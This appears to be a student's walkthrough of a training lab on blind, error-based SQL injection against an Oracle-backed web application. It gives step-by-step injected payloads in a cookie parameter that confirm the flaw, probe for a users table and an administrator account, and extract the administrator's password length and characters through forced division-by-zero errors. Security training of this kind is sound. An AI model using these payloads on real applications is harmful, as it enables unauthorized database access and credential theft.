Blind sqli error based  

Prove that parameter is vulnerable
Single quote we get an error
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/bacf7b5b-2757-4758-96fc-29d8e28803bf)


Double quote the query return as expected 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/7bab4305-2a92-4043-b2a0-934d01fd9fee)





Adding concatenation character
```
Cookieid' || (select '') || '
```
Looks like this isnt a mysql but a oracle db 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/9ea021a0-67c8-4088-937d-b0d95e73b3f6)





Adding dual since it might be oracle
```
Cookieid' || (select '' from dual) ||  '
```
No error so this is a oracle db and vulnerable to sequel injection
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/e477ab26-f60c-4278-8414-fdd4ddbc3a38)





Output table that doesn't exist
```
' || (select '' from dualasfsf) || '
```
We get an error
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/fcec2cd6-4aeb-4c79-98b3-9036e45da495)




Confirm that users table exist in database
```
' || (select '' from user) || '
```
Error since the '' sql entry will select more than one entry  or a empty entry which might break our query  
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/0fb1389c-da56-41b9-8f18-94ce06e0b0fc)


Fix by adding rownum =1 
Which will make sure we only get 1 entry 
We don’t get an error so user tables exist
```
'  || (select '' from users where rownum=1) || '
``` 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/4e178806-7399-4dbf-bbe1-aea517ba1d42)


Confirm the administrator user exists in the users databases
Difficult to determine if this is a valid user or not so you can't tell if user exist in the database. It will not generate an error if there isnt a user in that table 
```
' || (select '' from users where username='administrator') || '
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/22a6ce95-e2be-41cf-bb99-274c7b1c459e)


We have to use the case which is if else clauses
We should get a 200 response
```
' || (select CASE WHEN (1=0) THEN TO_CHAR (1/0) ELSE '' END from dual)  || '
```

We should get an error
```
' || (select CASE WHEN (1=1) THEN TO_CHAR (1/0) ELSE '' end from dual)  || '
```

Order of execution the from clause is evaluated first before the select clause
Error will indicate the username exist
```
' || (select CASE WHEN (1=1) THEN TO_CHAR (1/0) ELSE '' end from users where username='administrator')  || '
```

Error response username exist
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/847d4c18-8bc7-414d-9cfe-48fa74053fa2)




Trying with username that doesn't exist will get you a 200 response cause it won't run the to_char which will generate a 200 response 
```
' || (select CASE WHEN (1=1) THEN TO_CHAR (1/0) ELSE '' end from users where username='viet')  || '
```

Determine length of password
Will error cause the password IS greater than 1 
```
' || (select CASE WHEN (1=1) THEN TO_CHAR (1/0) ELSE '' end from users where username='administrator' and length(password)>1)  || '
```

Will do a 200 response cause the password is not greater than 50
```
' || (select CASE WHEN (1=1) THEN TO_CHAR (1/0) ELSE '' end from users where username='administrator' and length(password)>50)  || '
```

Put on intruder and payload number
Exactly 20 characters since that when it stopped and gave us an error 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/5bf01a7c-2b0d-4e65-b6ab-e5c5e483baf5)


Output password 
Use cluster bombs
```
' || (select CASE WHEN (1=1) THEN TO_CHAR (1/0) ELSE '' END FROM users where username='administrator' and substr(password,1,1) = 'a')  || '
```
Error status 500 will be our password 
We got password
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/97abf4bb-c216-4c06-a08d-1893c3e9ce8e)


